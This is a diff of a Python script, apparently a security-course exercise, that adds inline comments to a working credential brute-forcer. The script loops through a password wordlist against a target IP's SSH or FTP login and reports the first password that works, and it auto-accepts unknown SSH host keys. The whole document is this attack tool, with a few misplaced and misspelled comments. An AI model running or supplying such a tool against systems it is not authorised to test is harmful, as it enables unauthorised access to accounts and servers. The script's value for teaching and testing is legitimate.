@@ -58,43 +58,43 @@ drops. This becomes part of your evidence trail.
 """
 
 # Your imports go here
-import argparse
+import argparse               #import all libraries needed 
 import ftplib
 import sys
 import time
 from datetime import datetime
 from pathlib import Path
 
-try:
+try:                   #try importing paramiko -SSH library
     import paramiko
 except ImportError:
-    print("[-] paramiko not installed. Run: pip install paramiko", file=sys.stderr)
+    print("[-] paramiko not installed. Run: pip install paramiko", file=sys.stderr)    #if missing, return error message 
     sys.exit(1)
 
 
-def parse_arguments():
+def parse_arguments():            #parse command line arguments 
     parser = argparse.ArgumentParser(description="Brute force validator")
 
-    parser.add_argument("target", help="Target IP address")
+    parser.add_argument("target", help="Target IP address")    #target IP
 
-    parser.add_argument("--service", required=True, choices=["ssh", "ftp"])
+    parser.add_argument("--service", required=True, choices=["ssh", "ftp"])       #choose service type SSH or FTP 
 
-    parser.add_argument("--user", required=True)
+    parser.add_argument("--user", required=True)       #username for login 
 
-    parser.add_argument("--wordlist", required=True, type=Path)
+    parser.add_argument("--wordlist", required=True, type=Path)    #path to wordlist file 
 
-    parser.add_argument("--port", type=int, default=None)
+    parser.add_argument("--port", type=int, default=None)   #original port number 
 
     return parser.parse_args()
 
 
-def load_wordlist(wordlist_path: Path) -> list[str]:
+def load_wordlist(wordlist_path: Path) -> list[str]:      #load password for word list
     if not wordlist_path.exists():
         raise FileNotFoundError("Wordlist not found")
 
-    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
+    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:     #read file
         words = []
-        for line in f:
+        for line in f:      #read each file 
             line = line.strip()
             if line:
                 words.append(line)
@@ -102,28 +102,28 @@ def load_wordlist(wordlist_path: Path) -> list[str]:
     return words
 
 
-def attempt_ftp(target: str, user: str, password: str, port: int) -> bool:
+def attempt_ftp(target: str, user: str, password: str, port: int) -> bool:     #ftplogin 
     try:
         ftp = ftplib.FTP()
-        ftp.connect(target, port, timeout=2)
-        ftp.login(user=user, passwd=password)
+        ftp.connect(target, port, timeout=2)     #connect to ftp
+        ftp.login(user=user, passwd=password)   #try loggin in with username and password 
         ftp.quit()
         return True
-    except Exception:
+    except Exception:     #if login fails, return false 
         return False
 
 
-def attempt_ssh(target: str, user: str, password: str) -> bool:
+def attempt_ssh(target: str, user: str, password: str) -> bool:       #ssh login 
     try:
         client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    #auto accept unknown host keys
 
         client.connect(
-            hostname=target,
+            hostname=target,          #attempt ssh login 
             username=user,
             password=password,
             timeout=2,
-            allow_agent=False,
+            allow_agent=False,         #if llogin fails return false 
             look_for_keys=False,
         )
 
@@ -135,10 +135,10 @@ def attempt_ssh(target: str, user: str, password: str) -> bool:
 
 
 def main():
-    args = parse_arguments()
+    args = parse_arguments()    #get user argument 
 
     try:
-        passwords = load_wordlist(args.wordlist)
+        passwords = load_wordlist(args.wordlist)      #load password list
     except Exception:
         sys.exit(1)
 
@@ -147,16 +147,16 @@ def main():
         time.sleep(0.1)
 
         if args.service == "ftp":
-            port = args.port if args.port else 21
+            port = args.port if args.port else 21           #default port 21 
             success = attempt_ftp(args.target, args.user, password, port)
         else:
             success = attempt_ssh(args.target, args.user, password)
 
         if success:
-            print(f"[+] SUCCESS: Password found: {password}")
+            print(f"[+] SUCCESS: Password found: {password}")     #if login worked 
             return
 
-    print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")
+    print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")   #if no password wroked 
 
 
 if __name__ == "__main__":
